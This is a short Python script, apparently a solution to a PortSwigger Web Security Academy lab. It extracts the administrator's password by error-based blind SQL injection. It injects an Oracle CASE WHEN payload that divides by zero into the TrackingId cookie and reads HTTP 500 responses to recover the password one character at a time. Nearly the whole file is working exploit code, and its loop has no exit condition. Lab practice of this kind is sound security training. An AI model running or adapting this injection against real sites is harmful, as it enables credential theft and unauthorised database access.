import requests, string

alphabetList = list(string.printable)

restart = True

counter = 0

password = ""

# Rownum = 1 is to ensure that we only receive 1 or less rows back. 
# This is because you can't get more than one row back in a subquery in this case 
# when we compare the result of this subquery to a single letter. 

#This issue stems from the fact that we join the "dual" table onto the users table. 
# This task can be solved without doing that, but here we just make sure and allow more freedom for our case when.



while restart:

    counter = counter +1

    for item in alphabetList:

        
        # The tracking ID with the SQL query
        trackingIDString = 'yA1fqG0J7aT6mdR6\' AND (SELECT CASE WHEN (username = \'administrator\' AND SUBSTR(password, {}, 1) = \'{}\') THEN to_char(1/0) else \'a\' end from users,dual WHERE ROWNUM = 1) =\'a'.format(counter,item)

        cookies = {'TrackingId': trackingIDString,'session':'xcF5n0Zb1eA929A9A1B7m13YBYEAvAyv'}

        data = {'csrf' : 'LjRiTuiN01mhp8QNhwIsntBIho5oE10G','username':'asd','password':'aasd'}

        testPostRequest = requests.post("https://aca41f491fd8af41808c5a5d00f000fd.web-security-academy.net/login",cookies=cookies,data=data)

        resultData = testPostRequest.text

        statuscode = testPostRequest.status_code

        #if "Welcome back!" in resultData:

        if  statuscode == 500:

            password+=item

            print(password)

            break
